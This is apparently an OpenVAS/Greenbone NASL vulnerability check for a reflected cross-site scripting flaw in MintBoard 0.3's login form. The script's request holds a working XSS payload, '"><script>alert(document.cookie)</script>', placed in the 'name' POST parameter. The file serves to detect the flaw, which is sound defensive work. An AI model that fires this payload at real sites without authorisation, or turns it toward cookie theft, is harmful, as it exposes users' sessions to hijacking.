# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803828");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-07-18 12:41:03 +0530 (Thu, 18 Jul 2013)");
  script_name("MintBoard Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"MintBoard is prone to a cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted data via HTTP POST request and checks whether it is able to
  read the cookie or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Input passed via 'name' and 'pass' POST parameters to 'signup' or 'login'
  action upon submission to the index.php script is not properly sanitised
  before being returned to the user.");

  script_tag(name:"affected", value:"MintBoard 0.3 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Jul/101");
  script_xref(name:"URL", value:"http://www.censimentoartisticoromano.it/category/exploit/webapps");
  script_xref(name:"URL", value:"https://www.mavitunasecurity.com/xss-vulnerabilities-in-mintboard");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/mintboard-03-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);
vtstrings = get_vt_strings();

foreach dir (make_list_unique("/", "/mintboard", "/forum", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir,"/index.php"),  port:port);

  if('>Mintboard' >< res && '>Forums' >< res)
  {
    url = dir + '/index.php?login' ;
    postData = 'name="><script>alert(document.cookie)</script>&pass=' + vtstrings["default"];

    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postData), "\r\n",
                    "\r\n", postData, "\r\n");

    rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

    if(rcvRes =~ "^HTTP/1\.[01] 200" && '><script>alert(document.cookie)</script>' >< rcvRes)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
